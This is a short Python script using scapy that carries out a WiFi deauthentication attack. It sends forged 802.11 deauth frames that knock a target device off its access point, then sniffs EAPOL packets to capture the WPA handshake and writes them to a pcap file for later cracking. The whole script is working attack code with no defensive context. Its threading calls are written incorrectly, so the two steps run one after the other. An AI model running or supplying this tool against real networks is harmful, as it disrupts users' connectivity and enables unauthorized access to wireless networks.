import threading
from scapy.layers.dot11 import *
import sys

from scapy.layers.eap import EAPOL
from scapy.utils import wrpcap

count = sys.argv[1]  # Amount of DeAuth's to send
targetMAC = sys.argv[2]  # Target MAC Address
APMAC = sys.argv[3]  # Access Point MAC Address
iface = sys.argv[4]

# Constructing DeAuth message
deauth = RadioTap()/Dot11(
            type=0, subtype=12, addr1=targetMAC, addr2=APMAC, addr3=APMAC)/Dot11Deauth(
            reason=4)


# Function that send the deauthentication messages
def deauthenticate(msg, count, iface):
    print("Sending packets ")
    for i in range(int(count)):
        sendp(msg, iface=iface, verbose=0)


# Getting the WPA Handshake
def get_handshake(iface):
    print("Capturing packets")

    def get_WPA(pkt):
        if EAPOL in pkt:
            allpackets.append(pkt)
            print("Packet Saved!")

    allpackets = []
    pkt = sniff(iface=iface, count=4, prn=get_WPA)
    wrpcap('sniffed.pcap', allpackets)


threading.Thread(target=deauthenticate(deauth, count, iface)).start()
threading.Thread(target=get_handshake(iface)).start()
